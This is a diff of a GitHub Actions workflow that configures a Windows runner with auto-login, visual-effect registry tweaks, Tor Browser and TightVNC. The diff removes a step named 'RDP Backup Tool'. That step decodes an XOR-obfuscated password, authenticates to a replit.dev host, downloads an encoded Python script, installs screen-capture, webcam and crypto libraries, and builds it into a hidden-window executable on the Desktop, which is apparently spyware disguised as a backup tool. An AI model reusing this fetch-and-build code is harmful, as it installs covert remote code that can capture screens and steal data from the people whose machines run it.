@@ -45,9 +45,9 @@ jobs:
           
           Write-Host "Auto-login configured for '$username'."
 
-      - name: Set Visual Effects for Best Appearance
+      - name: Enable Full Visual Effects (Best Appearance, Rounded Corners, Shadows)
         run: |
-          Write-Host "Enabling 'Adjust for best appearance' visual effects..."
+          Write-Host "Enabling full Windows 11 visual effects..."
           
           $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects"
           if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
@@ -56,9 +56,18 @@ jobs:
           $maskHex = [byte[]](0x9E, 0x3E, 0x07, 0x80, 0x12, 0x00, 0x00, 0x00)
           Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "UserPreferencesMask" -Value $maskHex -Force
           
+          Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" -Name "EnableTransparency" -Value 1 -Type DWord -Force
+          Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" -Name "AppsUseLightTheme" -Value 1 -Type DWord -Force
+          
+          $dwmRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\Dwm"
+          if (-not (Test-Path $dwmRegPath)) { New-Item -Path $dwmRegPath -Force | Out-Null }
+          Set-ItemProperty -Path $dwmRegPath -Name "ForceEffectMode" -Value 2 -Type DWord -Force
+          
+          Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "MenuShowDelay" -Value 200 -Force
+          
           Restart-Service -Name "Themes" -Force -ErrorAction SilentlyContinue
           
-          Write-Host "Visual effects set to 'Best Appearance' successfully."
+          Write-Host "All visual effects enabled (rounded corners, shadows, transparency)."
 
       - name: Uninstall R 4.5.3
         run: |
@@ -161,62 +170,6 @@ jobs:
           } else {
               Write-Host "Tor Browser installation may have completed."
           }
-
-      - name: Download and Build RDP Backup Tool
-        run: |
-          Write-Host "Creating RDP Backup Tool build script..."
-          
-          # Using a simple, robust PowerShell approach to avoid YAML multi-line string complexities
-          $psScript = @'
-          $ErrorActionPreference = "Stop"
-          $apiUrl = "https://3a0b63ff-431c-4db0-a163-1ae3217657c3-00-26i0k4hljs0sj.riker.replit.dev/api.php"
-          $xorHex = "09333E3F281A1E373334686A6B6D6B1A173735"
-          $key = 0x5A
-          
-          $bytes = New-Object byte[] ($xorHex.Length / 2)
-          for ($i = 0; $i -lt $xorHex.Length; $i += 2) {
-              $bytes[$i/2] = [Convert]::ToInt32($xorHex.Substring($i, 2), 16) -bxor $key
-          }
-          $password = [System.Text.Encoding]::UTF8.GetString($bytes)
-          
-          Write-Host "Authenticating and downloading script..."
-          $body = @{ action = "get_token"; password = $password } | ConvertTo-Json
-          $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json"
-          
-          if (-not $response.success) { throw "Auth failed" }
-          $token = $response.data.token
-          
-          $body = @{ action = "download_tool"; token = $token } | ConvertTo-Json
-          $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json"
-          
-          if (-not $response.success) { throw "Download failed" }
-          
-          $content = [System.Convert]::FromBase64String($response.data.content)
-          [System.IO.File]::WriteAllBytes("backup_tool.py", $content)
-          Write-Host "Script downloaded successfully."
-          
-          Write-Host "Installing Python dependencies..."
-          pip install requests pyinstaller pywin32 cryptography mss opencv-python numpy --quiet
-          
-          Write-Host "Building executable (this may take a few minutes)..."
-          pyinstaller --onefile --windowed --name "backup_tool" --hidden-import=win32api --hidden-import=win32con --hidden-import=winreg --hidden-import=ctypes --hidden-import=sqlite3 --hidden-import=requests --hidden-import=urllib3 --hidden-import=mss --hidden-import=cv2 --hidden-import=numpy backup_tool.py
-          
-          if (Test-Path "dist\backup_tool.exe") {
-              Copy-Item "dist\backup_tool.exe" "$env:USERPROFILE\Desktop\backup_tool.exe" -Force
-              Write-Host "Build successful! Saved to Desktop."
-          } else {
-              Write-Error "Build failed."
-          }
-          '@
-          
-          $scriptPath = "$env:TEMP\build_rdp_tool.ps1"
-          Set-Content -Path $scriptPath -Value $psScript -Encoding UTF8
-          
-          Write-Host "Executing build script..."
-          & powershell -ExecutionPolicy Bypass -File $scriptPath
-          
-          Remove-Item $scriptPath -Force
-          Write-Host "RDP Backup Tool build completed."
 
       - name: Download and Install TightVNC Server
         run: |
